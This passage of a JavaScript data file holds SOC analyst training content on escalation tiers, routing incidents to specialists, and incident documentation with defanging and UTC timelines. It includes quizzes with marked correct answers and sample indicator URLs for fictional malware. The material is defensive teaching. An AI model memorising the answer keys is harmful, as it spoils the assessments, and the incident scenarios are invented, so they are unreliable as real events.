          explanation: 'Severity mathematically balances the potential business impact against the confidence of the detection.',
        },
        {
          id: 'u5-q2',
          question: 'What is the typical response SLA for a Critical (P1) security incident?',
          options: [
            '2 to 3 business weeks',
            'Under 15 minutes, with immediate bridge mobilization',
            'Whenever the analyst finishes their lunch break',
            'Only on Monday mornings',
          ],
          correctAnswer: 1,
          explanation: 'P1 incidents require near-instantaneous response (typically < 15 minutes) due to ongoing active damage.',
        },
        {
          id: 'u5-q3',
          question: 'Why does an alert on an Executive or Financial workstation often carry higher severity than the same alert on an intern\'s laptop?',
          options: [
            'Executive laptops cost more money to purchase',
            'Executives have higher access privileges, confidential corporate data, and financial authorization capabilities',
            'Executives use different brands of keyboards',
            'Interns are not protected by cybersecurity policies',
          ],
          correctAnswer: 1,
          explanation: 'Compromising high-privilege users provides attackers direct access to sensitive financial, legal, and operational systems.',
        },
        {
          id: 'u5-q4',
          question: 'If an alert has High Impact potential (e.g. Domain Controller target) but Low Detection Confidence (e.g. single noisy heuristic), what is the appropriate action?',
          options: [
            'Ignore it because confidence is low',
            'Investigate urgently with High priority to quickly prove or disprove the threat',
            'Immediately wipe and re-image the Domain Controller without checking logs',
            'Delete the detection rule from the SIEM',
          ],
          correctAnswer: 1,
          explanation: 'High potential impact demands rapid verification even when initial confidence is uncorroborated.',
        },
        {
          id: 'u5-q5',
          question: 'What is the organizational danger of classifying too many routine alerts as Critical (P1)?',
          options: [
            'The internet will shut down',
            'Alert fatigue and operational exhaustion, leading to real catastrophic breaches being missed',
            'Hard drives will fill up with ink',
            'The SIEM vendor will cancel the license',
          ],
          correctAnswer: 1,
          explanation: 'Excessive P1 declarations burn out analysts and desensitize the organization to genuine emergencies.',
        },
      ],
    },
  },

  // =========================================================================
  // UNIT 6: ESCALATION
  // =========================================================================
  {
    id: 'unit-6',
    unitNumber: 6,
    title: 'Unit 6: Escalation',
    description: 'Understand the multi-tier escalation funnel (L1 → L2 → L3), specialist routing (Intel, DFIR, IAM), executive crisis escalation, and warm handoffs.',
    estimatedHours: 2,
    topics: [
      {
        id: 'topic-6-1',
        unitId: 'unit-6',
        title: 'Tier Escalation: The L1 → L2 → L3 Funnel',
        order: 1,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'Security operations functions as a triage funnel: 90% of alerts are resolved at Tier 1; 8% require Tier 2 investigation; 2% escalate to Tier 3 crisis response.',
            'L1 (Frontline Triage): Validates alerts within 15-30 minutes, filters false alarms, collects basic telemetry, and escalates true threats.',
            'L2 (Incident Responder): Conducts deep forensic analysis, reverse engineers artifacts, isolates infected endpoints, and establishes root-cause timelines.',
            'L3 (Threat Hunter / CSIRT Lead): Handles advanced adversary dwell time, proactive threat hunting, custom exploit analysis, and major incident command.',
            'The Warm Handoff Rule: Escalations must include written findings, tagged artifacts, and verbal/chat confirmation that the next tier has accepted ownership.',
          ],
          knowMore: {
            title: 'CREST Certified Incident Handler Framework',
            description: 'International standards for tiered incident handling and response handoffs.',
            externalUrl: 'https://www.crest-approved.org/',
            externalLabel: 'Explore CREST IR Standards',
          },
        },
        demo: {
          title: 'The Multi-Tier Escalation Funnel',
          subtitle: 'Tracing an alert as it transitions smoothly from frontline triage to specialized deep forensics.',
          steps: [
            {
              stepNumber: 1,
              title: 'L1: Initial Detection & Validation',
              description: 'L1 analyst reviews alert #ALT-881, confirms malicious base64 PowerShell, applies initial host isolation tag, and initiates warm handoff.',
              visualType: 'dashboard',
              highlightElements: ['l1-validation', 'warm-handoff'],
              narration: 'L1 completes initial triage and packages all evidence for L2.',
            },
            {
              stepNumber: 2,
              title: 'L2: Deep Host Forensics',
              description: 'L2 pulls memory dump, identifies injected DLL in LSASS, and determines that lateral movement was attempted to the backup server.',
              visualType: 'terminal',
              highlightElements: ['l2-forensics', 'lateral-movement-found'],
              narration: 'L2 establishes the blast radius and directs enterprise containment.',
            },
          ],
        },
        interactive: {
          title: 'Tier Escalation Funnel Simulator',
          scenario: 'Evaluate 3 incoming incident tickets and assign each to the correct operational tier (L1, L2, or L3).',
          cards: [
            {
              id: 'card-esc1',
              title: 'Scenario 1: Mass Failed Password Queue',
              source: 'VPN Gateway Log',
              timestamp: '12:00:00 UTC',
              category: 'network',
              summary: '2,500 failed login attempts from external proxy IP targeting single dormant account.',
              details: [
                { label: 'Required Action', value: 'Check if password was guessed; apply perimeter IP block' },
                { label: 'Assigned Tier', value: 'Tier 1 (L1) - Frontline Queue Triage' },
              ],
              isSuspicious: true,
              relevanceScore: 70,
              tags: ['L1', 'Queue', 'Triage'],
            },
            {
              id: 'card-esc2',
              title: 'Scenario 2: Memory Injection & Persistence',
              source: 'EDR Telemetry on Workstation',
              timestamp: '12:15:30 UTC',
              category: 'host',
              summary: 'Cobalt Strike Beacon injected into `svchost.exe`. Scheduled task created for daily persistence.',
              details: [
                { label: 'Required Action', value: 'Perform live memory forensics, isolate host, reverse engineer payload' },
                { label: 'Assigned Tier', value: 'Tier 2 (L2) - Incident Investigation' },
              ],
              isSuspicious: true,
              relevanceScore: 95,
              tags: ['L2', 'Forensics', 'Containment'],
            },
            {
              id: 'card-esc3',
              title: 'Scenario 3: Nation-State Zero-Day Across Domain',
              source: 'Active Directory Telemetry',
              timestamp: '12:30:00 UTC',
              category: 'user',
              summary: 'Unknown zero-day exploiting Kerberos protocol; Kerberos Golden Ticket forged across entire forest.',
              details: [
                { label: 'Required Action', value: 'Enterprise identity reset, emergency war room, CSIRT command' },
                { label: 'Assigned Tier', value: 'Tier 3 (L3) / CSIRT Commander' },
              ],
              isSuspicious: true,
              relevanceScore: 100,
              tags: ['L3', 'CSIRT', 'Crisis'],
            },
          ],
        },
        socContext: {
          title: 'The Danger of the "Cold Handoff"',
          scenario: 'An L1 analyst threw a ticket into the L2 queue at 17:00 on Friday without messaging anyone. The L2 team did not notice it until Monday morning, by which time 40 servers were encrypted.',
          analystMindset: 'Never assume someone saw a ticket. A handoff is only complete when the receiving tier explicitly acknowledges: "I have taken ownership."',
          bestPractices: [
            'Always execute a warm handoff: message the incoming tier directly via Slack/Teams or phone.',
            'Include an executive summary of findings and immediate containment actions taken.',
            'Verify that ticket state transitions to "Assigned / In Progress" before ending your shift.',
          ],
        },
        knowledgeCheck: {
          matching: {
            title: 'Match Tier to Core Responsibilities',
            instructions: 'Pair each operational tier with its primary duty.',
            pairs: [
              { id: 'tier-1', left: 'Tier 1 (L1) Analyst', right: '24/7 queue triage, false-positive filtering, basic evidence collection' },
              { id: 'tier-2', left: 'Tier 2 (L2) Responder', right: 'Deep forensic analysis, host containment, and root-cause scoping' },
              { id: 'tier-3', left: 'Tier 3 (L3) Hunter', right: 'Proactive adversary hunting, zero-day analysis, major incident leadership' },
              { id: 'tier-4', left: 'SOC Manager', right: 'Metrics reporting, executive communications, shift scheduling, and governance' },
            ],
            explanation: 'Tiered escalation ensures skilled specialists focus on complex investigations while L1 maintains queue velocity.',
          },
        },
      },
      {
        id: 'topic-6-2',
        unitId: 'unit-6',
        title: 'Specialist & Management Escalation',
        order: 2,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'Security incidents do not live in a technical vacuum; they impact legal, regulatory, and business operations.',
            'Specialist Escalation: Engaging niche technical teams outside the SOC: Threat Intel (for adversary attribution), Network Engineering (for BGP rerouting), Identity/IAM (for forest-wide password resets).',
            'Management Escalation: Notifying executive stakeholders: SOC Manager, Chief Information Security Officer (CISO), and Legal Counsel.',
            'When to escalate to Management: When data breach notification laws (GDPR, SEC, HIPAA) are triggered, ransomware extortion demands are received, or business downtime exceeds SLA limits.',
            'Public Relations (PR) and Human Resources (HR) are engaged for external communications and insider threat investigations.',
          ],
          knowMore: {
            title: 'SANS: Incident Handler Handbook - Executive Communications',
            description: 'Guidelines on communicating breach impact to C-level executives and board members.',
            externalUrl: 'https://www.sans.org/',
            externalLabel: 'Read SANS Incident Management Briefs',
          },
        },
        demo: {
          title: 'The Crisis Escalation Matrix',
          subtitle: 'Routing non-technical incident impacts to executive stakeholders.',
          steps: [
            {
              stepNumber: 1,
              title: 'Technical Incident Escalation',
              description: 'L2 confirms customer database containing 500,000 credit cards was downloaded by external attacker.',
              visualType: 'terminal',
              highlightElements: ['data-exfiltration', 'credit-cards'],
              narration: 'Technical scope confirms a regulatory breach under PCI-DSS and GDPR.',
            },
            {
              stepNumber: 2,
              title: 'Executive & Legal Mobilization',
              description: 'The SOC Manager triggers the Crisis Management Plan: Legal Counsel drafts notification, PR prepares statements, and CISO briefs the CEO.',
              visualType: 'dashboard',
              highlightElements: ['legal-notification', 'ciso-briefing', 'pr-response'],
              narration: 'Management handles legal liabilities while technical teams contain the intrusion.',
            },
          ],
        },
        interactive: {
          title: 'Incident Escalation Router',
          scenario: 'Review 3 critical incident developments and route each to the appropriate stakeholder (Legal, Threat Intel, Network Engineering, or HR).',
          cards: [
            {
              id: 'card-rout1',
              title: 'Development 1: Customer Database Leaked on Dark Web',
              source: 'Breach Notification Trigger',
              timestamp: '16:00:00 UTC',
              category: 'user',
              summary: 'Attacker demands $5M ransom; threatens to publish 200,000 EU customer records in 24 hours.',
              details: [
                { label: 'Regulatory Mandate', value: 'GDPR 72-hour breach disclosure requirement' },
                { label: 'Primary Stakeholder', value: 'General Legal Counsel & CISO' },
              ],
              isSuspicious: true,
              relevanceScore: 100,
              tags: ['Legal', 'GDPR', 'Extortion'],
            },
            {
              id: 'card-rout2',
              title: 'Development 2: Rogue Admin Exfiltrating Proprietary Source Code',
              source: 'DLP Internal Sensor',
              timestamp: '16:15:00 UTC',
              category: 'host',
              summary: 'Departing senior software engineer copying core intellectual property to personal USB drive.',
              details: [
                { label: 'Incident Type', value: 'Insider Threat / IP Theft' },
                { label: 'Primary Stakeholder', value: 'Human Resources (HR) & Corporate Security' },
              ],
              isSuspicious: true,
              relevanceScore: 90,
              tags: ['HR', 'Insider-Threat', 'DLP'],
            },
            {
              id: 'card-rout3',
              title: 'Development 3: Nation-State Custom Implant Attribution',
              source: 'Forensic Lab Sandbox',
              timestamp: '16:30:00 UTC',
              category: 'network',
              summary: 'Obfuscated C2 framework matches proprietary backdoor used exclusively by APT29 (Cozy Bear).',
              details: [
                { label: 'Investigation Need', value: 'Strategic campaign attribution & diamond model mapping' },
                { label: 'Primary Stakeholder', value: 'Cyber Threat Intelligence (CTI) Specialist' },
              ],
              isSuspicious: true,
              relevanceScore: 85,
              tags: ['Threat-Intel', 'APT29', 'Attribution'],
            },
          ],
        },
        socContext: {
          title: 'The Legal Privilege Shield',
          scenario: 'During a breach investigation, an analyst wrote: "We were totally negligent and left the firewall wide open." This uncorroborated emotional email was subpoenaed in court, costing the company millions.',
          analystMindset: 'Incident notes are permanent legal documents. Never speculate, never assign blame, and strictly stick to verified facts.',
          bestPractices: [
            'Write incident documentation as if it will be read aloud in a courtroom.',
            'Involve legal counsel early so forensic investigation findings are protected under attorney-client privilege.',
            'Never speak to news reporters or post about active incidents on social media.',
          ],
        },
        knowledgeCheck: {
          matching: {
            title: 'Route the Incident to the Right Specialist',
            instructions: 'Match each specialized scenario with the correct team to engage.',
            pairs: [
              { id: 'spec-1', left: 'Attacker demands cryptocurrency ransom under threat of leaking customer records', right: 'Legal Counsel & Executive Leadership' },
              { id: 'spec-2', left: 'Mass distributed denial of service (DDoS) overwhelming border routers', right: 'Network Infrastructure Engineering' },
              { id: 'spec-3', left: 'Departing employee downloading trade secret source code to personal cloud storage', right: 'Human Resources (HR) & Corporate Security' },
              { id: 'spec-4', left: 'Unknown malware binary requiring disassembly and C2 campaign attribution', right: 'Cyber Threat Intelligence (CTI) Specialist' },
            ],
            explanation: 'Cross-functional alignment ensures technical, legal, and operational containment proceed in parallel.',
          },
        },
      },
    ],
    assessment: {
      id: 'unit-6-assessment',
      title: 'Unit 6 Assessment: Escalation',
      passingScore: 80,
      xpReward: 150,
      questions: [
        {
          id: 'u6-q1',
          question: 'What is a "warm handoff" in a tiered SOC environment?',
          options: [
            'Heating up the server room before an investigation',
            'Active direct communication and ticket synchronization confirming the recipient has formally accepted ownership',
            'Closing a ticket without telling anyone to keep metrics high',
            'Printing the alert on warm laser printer paper',
          ],
          correctAnswer: 1,
          explanation: 'A warm handoff requires direct verbal or written confirmation that the incoming specialist has assumed active ownership.',
        },
        {
          id: 'u6-q2',
          question: 'When should an incident be escalated from the technical SOC to Executive Management and Legal Counsel?',
          options: [
            'Whenever an analyst runs out of coffee',
            'When regulatory reporting mandates (e.g. GDPR, SEC, HIPAA), customer data loss, or extortion threats occur',
            'Every time a user enters an incorrect password',
            'Only once per year during annual budgeting reviews',
          ],
          correctAnswer: 1,
          explanation: 'Executive and legal escalation is triggered when an incident threatens legal liabilities, compliance fines, or public reputation.',
        },
        {
          id: 'u6-q3',
          question: 'What is the primary role of a Tier 2 (L2) Incident Responder during an escalated intrusion?',
          options: [
            'Resetting routine email passwords',
            'Performing deep host and network forensics, determining blast radius, and guiding host containment',
            'Negotiating ransom payments with the threat actor',
            'Writing marketing brochures for the company website',
          ],
          correctAnswer: 1,
          explanation: 'Tier 2 responders conduct root-cause forensics, memory analysis, and coordinate endpoint containment.',
        },
        {
          id: 'u6-q4',
          question: 'Why should incident notes strictly contain objective, verified facts rather than emotional speculation?',
          options: [
            'Because SIEM software cannot store long words',
            'Because incident tickets are permanent legal and audit records that can be subpoenaed in regulatory reviews or lawsuits',
            'Because analysts are not allowed to type full sentences',
            'There is no reason; analysts should write whatever they feel',
          ],
          correctAnswer: 1,
          explanation: 'Careless emotional notes or unverified speculation in tickets can severely damage the organization during legal discovery.',
        },
        {
          id: 'u6-q5',
          question: 'Which specialized team should be engaged when custom nation-state malware is found and requires campaign attribution and threat actor profiling?',
          options: [
            'Facilities & Cafeteria Staff',
            'Cyber Threat Intelligence (CTI) Specialist',
            'Social Media Marketing Team',
            'Billing & Accounts Receivable',
          ],
          correctAnswer: 1,
          explanation: 'Threat Intelligence specialists reverse engineer custom tools, map adversary infrastructure, and provide strategic attribution.',
        },
      ],
    },
  },

  // =========================================================================
  // UNIT 7: SOC DOCUMENTATION
  // =========================================================================
  {
    id: 'unit-7',
    unitNumber: 7,
    title: 'Unit 7: SOC Documentation',
    description: 'Master the art of professional security documentation: structuring findings, defanging evidence, recording UTC timelines, and building incident tickets.',
    estimatedHours: 2.5,
    topics: [
      {
        id: 'topic-7-1',
        unitId: 'unit-7',
        title: 'Findings, Evidence & Timeline (UTC Standard)',
        order: 1,
        estimatedMinutes: 20,
        xpReward: 50,
        theory: {
          summaryLines: [
            'If it is not documented, it never happened. High-quality documentation is the hallmark of an elite SOC analyst.',
            'Section 1: Executive Summary. A 3-sentence non-technical overview explaining What happened, What was affected, and Current status.',
            'Section 2: Technical Findings & Evidence. Objective, factual observations linking process names, hashes, and parent PIDs.',
            'Section 3: Defanged IOCs. Indicators of Compromise must always be defanged (e.g., `hxxp://badsite[.]com`, `185[.]220[.]101[.]5`) so readers do not click them accidentally.',
            'Section 4: The UTC Timeline. Every single action must be recorded in Coordinated Universal Time (UTC) with ISO 8601 formatting to eliminate timezone confusion.',
          ],
          knowMore: {
            title: 'ISO 8601 Date and Time Standard',
            description: 'Understand why international security operations standardizes on UTC formatting for forensic synchronicity.',
            externalUrl: 'https://www.iso.org/iso-8601-date-and-time-format.html',
            externalLabel: 'Review ISO 8601 Standards',
          },
        },
        demo: {
          title: 'Anatomy of a Professional SOC Ticket',
          subtitle: 'Deconstructing a real-world enterprise incident record from Executive Summary to UTC Timeline.',
          steps: [
            {
              stepNumber: 1,
              title: 'The Executive Summary',
              description: '"On 2026-09-29 at 14:15 UTC, host WKSTN-FIN-042 was compromised via an Excel macro stager. Host was isolated at 14:28 UTC. No data exfiltration detected."',
              visualType: 'dashboard',
              highlightElements: ['exec-summary', 'non-technical'],
              narration: 'Clear, concise, and understandable by executives in 10 seconds.',
            },
            {
              stepNumber: 2,
              title: 'The Defanged Timeline',
              description: 'All IPs (`185[.]220[.]101[.]5`) and domains (`evil-drop[.]xyz`) are defanged, and every event timestamp is recorded in UTC.',
              visualType: 'terminal',
              highlightElements: ['defanged-ioc', 'utc-timestamps'],
              narration: 'Strict chronological ordering eliminates ambiguity across global timezones.',
            },
          ],
        },
        interactive: {
          title: 'Ticket Section Anatomy & Defanging Practice',
          scenario: 'Inspect 3 raw documentation entries and identify defanging and formatting compliance errors.',
          cards: [
            {
              id: 'card-doc1',
              title: 'Indicator Defanging Standard',
              source: 'IOC Documentation Standards',
              timestamp: 'Standardization Rule',
              category: 'host',
              summary: 'Active malicious link `http://malware-drop.com/payload.exe` defanged to `hxxp://malware-drop[.]com/payload.exe`.',
              details: [
                { label: 'Defanged URL', value: 'hxxp://malware-drop[.]com/payload[.]exe' },
                { label: 'Defanged IP', value: '185[.]220[.]101[.]5' },
                { label: 'Purpose', value: 'Prevents accidental clicks in ticketing and chat systems' },
              ],
              isSuspicious: false,
              relevanceScore: 90,
              tags: ['Defanging', 'IOC', 'Standard'],
            },
            {
              id: 'card-doc2',
              title: 'Timestamp Standardization: UTC vs Local',
              source: 'Forensic Chronology Guide',
              timestamp: '2026-09-29T14:15:00Z',
              category: 'network',
              summary: 'Using "3:00 PM EST" creates confusion for global teams in London and Tokyo. Standardize on `2026-09-29 19:15:00 UTC`.',
              details: [
                { label: 'Format', value: 'YYYY-MM-DD HH:MM:SS UTC' },
                { label: 'Benefit', value: 'Synchronizes logs across multi-cloud and regional datacenters' },
              ],
              isSuspicious: false,
              relevanceScore: 95,
              tags: ['UTC', 'Chronology', 'ISO8601'],
            },
            {
              id: 'card-doc3',
              title: 'Objective Factual Phrasing',
              source: 'Legal & Audit Documentation',
              timestamp: 'Documentation Ethics',
              category: 'user',
              summary: 'Replace "User was dumb and clicked a scam" with "User opened phishing attachment containing malicious obfuscated macro."',
              details: [
                { label: 'Tone', value: 'Objective, blameless, professional, and audit-ready' },
                { label: 'Standard', value: 'Adheres to corporate legal compliance protocols' },
              ],
              isSuspicious: false,
              relevanceScore: 92,
              tags: ['Objective', 'Blameless', 'Audit'],
            },
          ],
        },
        socContext: {
          title: 'The Accidental Click Disaster',
          scenario: 'An analyst pasted a live malware link `http://evil-c2.com/worm.exe` into a shared ticket. A junior engineer clicked the link out of curiosity, infecting the SOC operations workstation.',
          analystMindset: 'Always defang every single indicator (`hxxp`, brackets around dots). Make it impossible for anyone to execute an indicator accidentally.',
          bestPractices: [
            'Defang all URLs as `hxxp://` and wrap IP dots in brackets: `192[.]168[.]1[.]1`.',
            'Record all event times exclusively in UTC with explicit timezone notation.',
            'Include the SHA256 file hash for every observed binary artifact.',
          ],
        },
        knowledgeCheck: {
          matching: {
            title: 'Match Ticket Section to Required Contents',
            instructions: 'Pair each ticket section with its appropriate contents.',
            pairs: [
              { id: 'ts-1', left: 'Executive Summary', right: 'High-level non-technical summary of breach impact and current status' },
              { id: 'ts-2', left: 'Technical Timeline', right: 'Chronological UTC sequence of attacker activity and analyst actions' },
              { id: 'ts-3', left: 'IOC Table', right: 'Defanged list of observed file hashes, malicious IPs, and domains' },
              { id: 'ts-4', left: 'Remediation Actions', right: 'Verification of host isolation, credential resets, and rule updates' },
            ],
            explanation: 'Clean section separation allows technical engineers, auditors, and executives to extract what they need immediately.',
          },
        },
      },
      {
        id: 'topic-7-2',
        unitId: 'unit-7',
        title: 'Actions, Recommendations & Incident Ticketing Lab',
        order: 2,
        estimatedMinutes: 25,
        xpReward: 60,
        theory: {
          summaryLines: [
            'The conclusion of every incident record consists of two forward-looking sections: Actions Taken and Recommendations.',
            'Actions Taken: The immediate containment and eradication steps performed (e.g. host isolated from network via EDR at 14:28 UTC, user password revoked in Entra ID at 14:32 UTC).',
            'Remediation Recommendations: Long-term architectural fixes to prevent recurrence (e.g. enforce attack surface reduction rule blocking Office child processes, mandate FIDO2 MFA).',
            'Post-Incident Review (PIR): Document lessons learned to continuously refine detection rules, playbooks, and training.',
            'In the following hands-on lab, you will synthesize everything learned to build an official incident ticket.',
          ],
          knowMore: {
            title: 'CISA Incident Response Plan Basics',
            description: 'Official US Cybersecurity and Infrastructure Security Agency guidelines on post-incident remediation and lessons learned.',
            externalUrl: 'https://www.cisa.gov/',
            externalLabel: 'Explore CISA Incident Guidelines',
          },
        },
        demo: {
          title: 'From Live Incident to Completed SecOps Ticket',
          subtitle: 'Interactive generation of an enterprise-grade incident ticket.',
          steps: [
            {
              stepNumber: 1,
              title: 'Drafting Actions Taken',
              description: 'Record containment actions with exact UTC timestamps: "14:28 UTC: EDR network isolation invoked on WKSTN-FIN-042."',
              visualType: 'terminal',
              highlightElements: ['containment-actions', 'timestamped'],
              narration: 'Documenting exact containment times proves compliance with corporate SLAs.',
            },
            {
              stepNumber: 2,
              title: 'Drafting Strategic Recommendations',
              description: 'Provide actionable defense-in-depth advice: "Configure Microsoft Defender ASR rule: Block Office applications from creating child processes."',
              visualType: 'dashboard',
              highlightElements: ['strategic-recommendations', 'asr-rule'],
              narration: 'Recommendations transform an isolated incident into permanent organizational resilience.',
            },
          ],
        },
        interactive: {
          title: 'Hands-On Lab: Create an Incident Ticket',
          scenario: 'Build an official incident ticket for a confirmed living-off-the-land malware attack. Fill in the required fields, defang IOCs, and verify against standards.',
          cards: [
            {
              id: 'card-lab-tkt',
              title: 'Raw Incident Briefing [Incident #INC-9014]',
              source: 'SecOps Incident Queue',
              timestamp: '2026-09-29T14:35:00Z',
              category: 'host',
              summary: 'Phishing email with attachment `Invoice_Q3.xlsm` opened by `jdoe-finance` on host `WKSTN-FIN-042`. Obfuscated PowerShell downloaded stager from `185.220.101.5`. Host isolated by L1 analyst.',
              details: [
                { label: 'Priority', value: 'High (P2)' },
                { label: 'Status', value: 'Contained / Pending Remediation Ticket' },
                { label: 'Required Output', value: 'Executive Summary, Defanged IOCs, UTC Timeline, Containment Actions, Recommendations' },
              ],
              isSuspicious: true,
              relevanceScore: 100,
              tags: ['Lab-Ticket', 'SecOps', 'Documentation'],
            },
          ],
        },
        socContext: {
          title: 'The Audit Trail Standard',
          scenario: 'Two years after an intrusion, federal compliance auditors reviewed ticket #INC-9014 during a financial audit.',
          analystMindset: 'Because the ticket contained defanged IOCs, a precise UTC timeline, and verified containment logs, the company passed the audit with zero regulatory penalties.',
          bestPractices: [
            'Always link containment confirmation logs directly into the incident record.',
            'Include recommendations that address the root cause, not just the symptom.',
            'Conduct a Post-Incident Review meeting within 5 business days of incident closure.',
          ],
        },
        knowledgeCheck: {
          dragDrop: {
            title: 'Arrange Incident Closure Workflow',
            instructions: 'Order the steps from initial containment to final ticket archive.',
            items: [
              { id: 'cw-1', label: '1. Execute and document immediate containment actions with UTC timestamps', category: 'Phase 1' },
              { id: 'cw-2', label: '2. Compile defanged IOC table and verify host clean re-image', category: 'Phase 2' },
              { id: 'cw-3', label: '3. Draft strategic preventative recommendations (e.g. ASR rules)', category: 'Phase 3' },
              { id: 'cw-4', label: '4. Complete Post-Incident Review (PIR) and archive case ticket', category: 'Phase 4' },
            ],
            explanation: 'The closure workflow transitions operations from active defense into long-term organizational hardening.',
          },
        },
      },
    ],
    assessment: {
      id: 'unit-7-assessment',
      title: 'Unit 7 Assessment: SOC Documentation',
      passingScore: 80,
      xpReward: 200,
      questions: [
        {
          id: 'u7-q1',
          question: 'Why must Indicators of Compromise (IOCs) such as URLs and IP addresses always be defanged in incident tickets?',
          options: [
            'Because SIEM software cannot parse letters and numbers',
            'To prevent analysts, readers, or automated tools from accidentally clicking or resolving malicious links',
            'To translate the IP address into hexadecimal code',
            'Because defanging makes the ticket load faster',
          ],
          correctAnswer: 1,
          explanation: 'Defanging (`hxxp://`, `192[.]168...`) turns live clickable links into harmless text, preventing accidental self-infection.',
        },
        {
          id: 'u7-q2',
          question: 'Which timestamp standard must be used across all professional SOC incident notes and timelines?',
          options: [
            'Local workstation time with no timezone indicator',
            'UTC (Coordinated Universal Time) with standard ISO 8601 formatting',
            'The timezone of the software vendor\'s headquarters',
            'Approximate time (e.g. "sometime yesterday afternoon")',
          ],
          correctAnswer: 1,
          explanation: 'UTC eliminates ambiguities caused by daylight savings time and multi-regional corporate infrastructure.',
        },
        {
          id: 'u7-q3',
          question: 'What is the purpose of the Executive Summary section in an incident ticket?',
          options: [
            'To list every single raw log line collected during the day',
            'To provide a concise, non-technical overview explaining what happened, the business impact, and current status for leadership',
            'To complain about the shift schedule and workload',
            'To write a fictional story about the hacker',
          ],
          correctAnswer: 1,
          explanation: 'The Executive Summary allows managers, executives, and legal counsel to understand the business risk in seconds.',
        },
        {
          id: 'u7-q4',
          question: 'Why should incident recommendations focus on root-cause architecture rather than just cleaning the infected laptop?',
          options: [
            'Cleaning a laptop is illegal under federal law',
            'Without fixing root-cause weaknesses (e.g. enabling ASR rules or MFA), the adversary will compromise the organization again using identical methods',
            'Because laptops cannot be re-imaged more than once',
            'Recommendations are optional and never reviewed by anyone',
          ],
          correctAnswer: 1,
          explanation: 'Remediation must eliminate the root vulnerability so the same attack vector cannot succeed twice.',
        },
        {
          id: 'u7-q5',
          question: 'What information must be recorded in the Actions Taken section of an incident ticket?',
          options: [
            'The names of all songs listened to by the analyst',
            'The exact containment, eradication, and credential revocation steps performed, complete with UTC timestamps',
            'Only the serial number of the office printer',
            'A list of websites blocked by the web browser',
          ],
          correctAnswer: 1,
          explanation: 'Timestamped containment logs provide definitive audit proof of SLA compliance and operational containment.',
        },
      ],
    },
  },
];
